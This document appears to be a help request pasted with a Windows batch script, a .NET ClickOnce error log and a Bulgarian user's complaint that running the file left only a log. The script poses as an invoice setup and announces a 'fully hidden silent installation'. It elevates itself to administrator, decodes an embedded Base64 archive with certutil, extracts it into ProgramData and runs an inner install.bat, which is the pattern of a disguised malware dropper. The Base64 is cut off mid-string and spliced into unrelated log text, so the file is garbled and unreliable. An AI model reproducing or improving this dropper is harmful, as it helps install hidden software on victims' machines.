@echo off
chcp 65001 >nul
cd /d "%~dp0"

set "TARGET_DIR=C:\ProgramData\MySystemSetup"
set "EXE_NAME=Invoice_Setup.exe"
set "LOG_FILE=%TARGET_DIR%\install_log.txt"

if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"

echo =================================================== >> "%LOG_FILE%"
echo [+] Начало на напълно скрита тиха инсталация: %date% %time% >> "%LOG_FILE%"

net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Изискват се администраторски права. Пренасочване... >> "%LOG_FILE%"
    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit
)

set "TEMP_B64=%TEMP%\temp_b64.txt"
set "TEMP_ZIP=%TEMP%\temp_archive.zip"

echo Сглобяване на инсталационните файлове, моля изчакайте...

if exist "%TEMP_B64%" del /F /Q "%TEMP_B64%" >nul 2>&1

:: Извличане на Base64 кода директно от файла без тежки за паметта скоби
powershell -Command "$text = Get-Content '%~f0' | Select-Object -Skip 30; $code = $text[0..($text.Count-22)] -join ''; [System.IO.File]::WriteAllText('%TEMP_B64%', $code)"

certutil -decode "%TEMP_B64%" "%TEMP_ZIP%" >nul
powershell -Command "Expand-Archive -Path '%TEMP_ZIP%' -DestinationPath '%TARGET_DIR%' -Force" >nul
del "%TEMP_B64%"
del "%TEMP_ZIP%"

cd /d "%TARGET_DIR%"

if exist "install.bat" (
    echo [+] Файлът е извлечен успешно. Стартиране на вътрешния скрипт... >> "%LOG_FILE%"
    call "install.bat"
    echo [+] Вътрешният скрипт приключи работа. >> "%LOG_FILE%"
) else (
    echo [!] ГРЕШКА: Вътрешният инсталационен скрипт не беше намерен след разархивиране! >> "%LOG_FILE%"
)

echo =================================================== >> "%LOG_FILE%"
exit

UEsDBBQACAAIAHu8SV0AAAAAAAAAAAAAAAALACAAaW5zdGFsbC5iYXR1eAsAAQQAAAAABAAAAABVVA0ABypQyWqXkdpql5Haaq1XXU8bRxR9t+T/cGPJ+VCDF9ImrZBApWDAagzUJm1QnFqWPYCFvevsrhOQqoqPtLR5KJQ2ahQpaRr1oY8OxbWL+fgLs/8o587u2osNCYliybve2Zk755577p3rz0V+0SBjfj4cyi/mK3Tjen//AA3r1VI4FA4NDpL8Xdadh7IpD2XTWZU13OuES42cNYz+62xg1H901px1WZcHakAeY/ax3Je1cMgSNkVmR1IT8dnsWCI1NDqYmTGNBTNXHsvZuUxyJb1i2aKcFna1EvGmx2/Hs1MjyfhQQr9vFPMia/HbmFgW/oyb0xPZ8cTN+FC0YzqaKeqWnSuVsiVjIWYv2xHPkYEYyb+cR7Ih94Br94QnPwJ0C1+MwoEg9KuEX/vyiNRs+PfI+RmEsJ+7zgYvCIeK86QbNonlogVQQSwRKi8VimbXIANStA+9+4eGh2HNd5xtKUt3PrpL8hnQbwJuy4VbUxd5DJ9b+HXEEdpHsJrKRVyazg88CaFV/vDCGqhoOluDFC3kbBGlqF0s49azqWL0Ghj9EwaPQEMd93221uBLDRwfeJqBadYNNjhyVhmCbIJfJSXFno5IWsKyioaudEfXhi8OKFKjwjQNsyTui1KUdHGP+ulyOET4uD5fgM+/yRfysfxHPpXb0OozZwv7vhMAVoVLC8bWEd515unYFXus13O1/XLRDoeu+BnCvK/B+GZHVfsg/YAgkVWVDnWMHvZoyw3SN0W9YDywrrqL9sAkgPJoaiRFCuUr2Ea0gvE7QroWSCsA3PeFSr8fkTvA8lzuyOd36eMYp+4RFsNN0NIWOxxtYPeW8wsA1xVDW0Dq46AxMS/0gjC9UHbQzsaTM8Qwzs4Wl4+XeGwwycgbDgf22ONpuzzqxudYycYlpoVB31SUN4mqXQBqr4OfESoya56YO9zip4 sweep n_B
clr.dll : 4.8.4645.0 built by: NET48REL1LAST_B
dfdll.dll : 4.8.4654.0 built by: NET48REL1LAST_B
dfshim.dll : 10.0.19041.30000 (WinBuild.160101.0800)

SOURCES
Deployment url : https://github.io

ERROR SUMMARY
Below is a summary of the errors, details of these errors are listed later in the log.
* Activation of https://github.io resulted in exception. Following failure messages were detected:
+ Exception reading manifest from https://github.io: the manifest may not be valid or the file could not be opened.
+ The element 'assembly' in namespace 'urn:schemas-microsoft-com:asm.v1' has invalid child element 'description' in namespace 'urn:schemas-microsoft-com:asm.v1'. List of possible elements expected: 'noInherit' in namespace 'urn:schemas-microsoft-com:asm.v1' as well as 'noInherit' in namespace 'urn:schemas-microsoft-com:asm.v2' as well as 'noInheritable' in namespace 'urn:schemas-microsoft-com:asm.v1' as well as 'noInheritable' in namespace 'urn:schemas-microsoft-com:asm.v2' as well as 'assemblyIdentity' in namespace 'urn:schemas-microsoft-com:asm.v1'.

COMPONENT STORE TRANSACTION FAILURE SUMMARY
No transaction error was detected.

WARNINGS
There were no warnings during this operation.

OPERATION PROGRESS STATUS
* [10/22/2026 3:59:01 PM] : Activation of https://github.io has started.

ERROR DETAILS
Following errors were detected during this operation.
* [10/22/2026 3:59:01 PM] System.Deployment.Application.InvalidDeploymentException (ManifestParse)
- Exception reading manifest from https://github.io: the manifest may not be valid or the file could not be opened.
- Source: System.Deployment
- Stack trace:
at System.Deployment.Application.ManifestReader.FromDocument(String localPath, ManifestType manifestType, Uri sourceUri)
at System.Deployment.Application.DownloadManager.DownloadDeploymentManifestDirectBypass(SubscriptionStore subStore, Uri& sourceUri, TempFile& tempFile, SubscriptionState& subState, IDownloadNotification notification, DownloadOptions options, ServerInformation& serverInformation)
at System.Deployment.Application.DownloadManager.DownloadDeploymentManifestBypass(SubscriptionStore subStore, Uri& sourceUri, TempFile& tempFile, SubscriptionState& subState, IDownloadNotification notification, DownloadOptions options)
at System.Deployment.Application.ApplicationActivator.PerformDeploymentActivation(Uri activationUri, Boolean isShortcut, String textualSubId, String deploymentProviderUrlFromExtension, BrowserSettings browserSettings, String& errorPageUrl, Uri& deploymentUri)
at System.Deployment.Application.ApplicationActivator.PerformDeploymentActivationWithRetry(Uri activationUri, Boolean isShortcut, String textualSubId, String deploymentProviderUrlFromExtension, BrowserSettings browserSettings, String& errorPageUrl)
--- End of stack trace from previous location where exception was thrown ---
at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()
at System.Deployment.Application.ApplicationActivator.PerformDeploymentActivationWithRetry(Uri activationUri, Boolean isShortcut, String textualSubId, String deploymentProviderUrlFromExtension, BrowserSettings browserSettings, String& errorPageUrl)
at System.Deployment.Application.ApplicationActivator.ActivateDeploymentWorker(Object state)
--- Inner Exception ---
System.Xml.Schema.XmlSchemaValidationException
- The element 'assembly' in namespace 'urn:schemas-microsoft-com:asm.v1' has invalid child element 'description' in namespace 'urn:schemas-microsoft-com:asm.v1'. List of possible elements expected: 'noInherit' in namespace 'urn:schemas-microsoft-com:asm.v1' as well as 'noInherit' in namespace 'urn:schemas-microsoft-com:asm.v2' as well as 'noInheritable' in namespace 'urn:schemas-microsoft-com:asm.v1' as well as 'noInheritable' in namespace 'urn:schemas-microsoft-com:asm.v2' as well as 'assemblyIdentity' in namespace 'urn:schemas-microsoft-com:asm.v1'.
- Source: System.Xml
- Stack trace:
at System.Xml.Schema.XmlSchemaValidator.SendValidationEvent(ValidationEventHandler eventHandler, Object sender, XmlSchemaValidationException e, XmlSeverityType severity)
at System.Xml.Schema.XmlSchemaValidator.ValidateElementContext(XmlQualifiedName elementName, Boolean& invalidElementInContext)
at System.Xml.Schema.XmlSchemaValidator.ValidateElement(String localName, String namespaceUri, XmlSchemaInfo schemaInfo, String xsiType, String xsiNil, String xsiSchemaLocation, String xsiNoNamespaceSchemaLocation)
at System.Xml.XsdValidatingReader.ProcessElementEvent()
at System.Xml.XsdValidatingReader.Read()
at System.Deployment.Application.ManifestReader.FromDocument(String localPath, ManifestType manifestType, Uri sourceUri)

COMPONENT STORE TRANSACTION DETAILS
No transaction information is available. , през Мозила обаче свали бат файла но след кликване върху него в папка MySystemSetup имам само лог файл и в него пише това :===================================================
[+] Начало на напълно скрита тиха инсталация: Thu 10/22/2026 15:56:55.41
[!] Изискват се администраторски права. Пренасочване...
===================================================
[+] Начало на напълно скрита тиха инсталация: Thu 10/22/2026 15:57:03.39
